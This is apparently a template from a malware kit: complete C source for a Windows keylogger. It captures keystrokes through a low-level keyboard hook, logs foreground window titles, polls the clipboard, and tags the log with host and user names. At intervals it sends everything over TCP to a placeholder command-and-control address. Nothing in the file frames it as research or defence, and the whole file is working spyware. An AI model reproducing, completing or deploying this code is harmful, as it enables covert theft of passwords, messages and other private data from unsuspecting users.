#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT {{C2_PORT}}
#define LOG_BUF_INIT (64 * 1024)
#define EXFIL_INTERVAL_MS 30000
#define EXFIL_THRESHOLD  (32 * 1024)
#define CLIP_POLL_MS     10000

/* ── growable buffer (same pattern as infostealer) ──────────────── */

static char *g_data = NULL;
static DWORD g_pos  = 0;
static DWORD g_cap  = 0;
static CRITICAL_SECTION g_lock;

static void emit(const char *d, DWORD n) {
    EnterCriticalSection(&g_lock);
    if (!g_data) { LeaveCriticalSection(&g_lock); return; }
    if (g_pos + n >= g_cap) {
        DWORD need = g_pos + n + (64 * 1024);
        char *re = (char *)realloc(g_data, need);
        if (!re) { LeaveCriticalSection(&g_lock); return; }
        g_data = re;
        g_cap = need;
    }
    memcpy(g_data + g_pos, d, n);
    g_pos += n;
    LeaveCriticalSection(&g_lock);
}

static void emitf(const char *fmt, ...) {
    char tmp[4096];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(tmp, sizeof(tmp), fmt, ap);
    va_end(ap);
    if (n > 0) emit(tmp, (DWORD)n);
}

/* ── exfiltration ───────────────────────────────────────────────── */

static BOOL exfil_send(const char *data, DWORD len) {
    if (len == 0) return TRUE;
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return FALSE;
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) { WSACleanup(); return FALSE; }

    struct sockaddr_in addr;
    ZeroMemory(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(C2_PORT);
    addr.sin_addr.s_addr = inet_addr(C2_ADDR);

    int retries = 3;
    while (retries-- > 0) {
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != SOCKET_ERROR)
            break;
        if (retries > 0) {
            closesocket(sock); Sleep(2000);
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sock == INVALID_SOCKET) { WSACleanup(); return FALSE; }
        } else { closesocket(sock); WSACleanup(); return FALSE; }
    }

    DWORD sent = 0;
    while (sent < len) {
        int n = send(sock, data + sent, (len - sent > 32768) ? 32768 : len - sent, 0);
        if (n <= 0) break;
        sent += n;
    }
    closesocket(sock);
    WSACleanup();
    return sent == len;
}

static void flush_buffer(void) {
    EnterCriticalSection(&g_lock);
    if (g_pos == 0) { LeaveCriticalSection(&g_lock); return; }
    char *copy = (char *)malloc(g_pos);
    DWORD copy_len = g_pos;
    if (copy) {
        memcpy(copy, g_data, g_pos);
        g_pos = 0;
    }
    LeaveCriticalSection(&g_lock);
    if (copy) {
        exfil_send(copy, copy_len);
        free(copy);
    }
}

/* ── active window tracking ─────────────────────────────────────── */

static char g_last_window[512] = {0};

static void check_active_window(void) {
    HWND fg = GetForegroundWindow();
    if (!fg) return;
    char title[512] = {0};
    GetWindowTextA(fg, title, sizeof(title) - 1);
    if (title[0] && strcmp(title, g_last_window) != 0) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        emitf("\r\n[%02d:%02d:%02d] ── %s ──\r\n",
              st.wHour, st.wMinute, st.wSecond, title);
        strncpy(g_last_window, title, sizeof(g_last_window) - 1);
    }
}

/* ── keyboard hook ──────────────────────────────────────────────── */

static HHOOK g_hook = NULL;

static const char *vk_label(DWORD vk) {
    switch (vk) {
        case VK_RETURN:  return "[ENTER]\r\n";
        case VK_BACK:    return "[BS]";
        case VK_TAB:     return "[TAB]";
        case VK_ESCAPE:  return "[ESC]";
        case VK_SPACE:   return " ";
        case VK_DELETE:  return "[DEL]";
        case VK_LEFT:    return "[LEFT]";
        case VK_RIGHT:   return "[RIGHT]";
        case VK_UP:      return "[UP]";
        case VK_DOWN:    return "[DOWN]";
        case VK_CAPITAL: return "[CAPS]";
        case VK_LSHIFT: case VK_RSHIFT:   return "";
        case VK_LCONTROL: case VK_RCONTROL: return "";
        case VK_LMENU: case VK_RMENU:     return "";
        case VK_LWIN: case VK_RWIN:       return "[WIN]";
        case VK_PRIOR:   return "[PGUP]";
        case VK_NEXT:    return "[PGDN]";
        case VK_HOME:    return "[HOME]";
        case VK_END:     return "[END]";
        case VK_INSERT:  return "[INS]";
        case VK_SNAPSHOT: return "[PRTSC]";
        default: break;
    }
    if (vk >= VK_F1 && vk <= VK_F24) {
        static char fbuf[8];
        snprintf(fbuf, sizeof(fbuf), "[F%d]", (int)(vk - VK_F1 + 1));
        return fbuf;
    }
    return NULL;
}

static LRESULT CALLBACK kb_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;

        check_active_window();

        BOOL ctrl  = GetAsyncKeyState(VK_CONTROL) & 0x8000;
        BOOL alt   = GetAsyncKeyState(VK_MENU) & 0x8000;

        if (ctrl || alt) {
            const char *lbl = vk_label(kb->vkCode);
            if (lbl && lbl[0]) {
                emitf("%s%s%s", ctrl ? "[CTRL+" : "[ALT+",
                      lbl[0] == '[' ? lbl + 1 : lbl,
                      lbl[0] != '[' ? "]" : "");
            } else {
                char c = (char)MapVirtualKeyA(kb->vkCode, MAPVK_VK_TO_CHAR);
                if (c) emitf("[%s%c]", ctrl ? "CTRL+" : "ALT+", c);
            }
        } else {
            const char *lbl = vk_label(kb->vkCode);
            if (lbl) {
                if (lbl[0]) emit(lbl, (DWORD)strlen(lbl));
            } else {
                BYTE ks[256];
                GetKeyboardState(ks);
                WCHAR wch[4] = {0};
                int ret = ToUnicodeEx(kb->vkCode, kb->scanCode, ks, wch, 4, 0,
                                      GetKeyboardLayout(0));
                if (ret > 0) {
                    char mb[8] = {0};
                    WideCharToMultiByte(CP_UTF8, 0, wch, ret, mb, sizeof(mb) - 1, NULL, NULL);
                    if (mb[0]) emit(mb, (DWORD)strlen(mb));
                }
            }
        }
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

/* ── clipboard monitor ──────────────────────────────────────────── */

static char g_last_clip[4096] = {0};

static void check_clipboard(void) {
    if (!OpenClipboard(NULL)) return;
    HANDLE h = GetClipboardData(CF_TEXT);
    if (h) {
        char *txt = (char *)GlobalLock(h);
        if (txt && txt[0]) {
            if (strcmp(txt, g_last_clip) != 0) {
                int len = (int)strlen(txt);
                if (len > (int)sizeof(g_last_clip) - 1)
                    len = (int)sizeof(g_last_clip) - 1;
                memcpy(g_last_clip, txt, len);
                g_last_clip[len] = '\0';
                SYSTEMTIME st;
                GetLocalTime(&st);
                emitf("\r\n[%02d:%02d:%02d] [CLIPBOARD] %.*s\r\n",
                      st.wHour, st.wMinute, st.wSecond,
                      len > 2048 ? 2048 : len, txt);
            }
        }
        GlobalUnlock(h);
    }
    CloseClipboard();
}

/* ── periodic exfil + clipboard thread ──────────────────────────── */

static DWORD WINAPI timer_thread(LPVOID param) {
    (void)param;
    DWORD clip_tick = 0;
    while (1) {
        Sleep(1000);
        clip_tick += 1000;
        if (clip_tick >= CLIP_POLL_MS) {
            check_clipboard();
            clip_tick = 0;
        }
        BOOL threshold;
        EnterCriticalSection(&g_lock);
        threshold = (g_pos >= EXFIL_THRESHOLD);
        LeaveCriticalSection(&g_lock);

        static DWORD exfil_tick = 0;
        exfil_tick += 1000;
        if (threshold || exfil_tick >= EXFIL_INTERVAL_MS) {
            flush_buffer();
            exfil_tick = 0;
        }
    }
    return 0;
}

/* ── main ───────────────────────────────────────────────────────── */

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);

    InitializeCriticalSection(&g_lock);
    g_data = (char *)malloc(LOG_BUF_INIT);
    if (!g_data) return 1;
    g_cap = LOG_BUF_INIT;
    g_pos = 0;

    SYSTEMTIME st;
    GetLocalTime(&st);
    emitf("=== KEYLOG START %04d-%02d-%02d %02d:%02d:%02d ===\r\n",
          st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

    char hostname[256] = {0};
    DWORD hn = sizeof(hostname);
    GetComputerNameA(hostname, &hn);
    char user[256] = {0};
    DWORD un = sizeof(user);
    GetUserNameA(user, &un);
    emitf("Host: %s  User: %s\r\n\r\n", hostname, user);

    CreateThread(NULL, 0, timer_thread, NULL, 0, NULL);

    g_hook = SetWindowsHookExA(WH_KEYBOARD_LL, kb_proc, GetModuleHandleA(NULL), 0);
    if (!g_hook) {
        flush_buffer();
        free(g_data);
        DeleteCriticalSection(&g_lock);
        return 1;
    }

    MSG msg;
    while (GetMessageA(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }

    UnhookWindowsHookEx(g_hook);
    flush_buffer();
    free(g_data);
    DeleteCriticalSection(&g_lock);
    return 0;
}
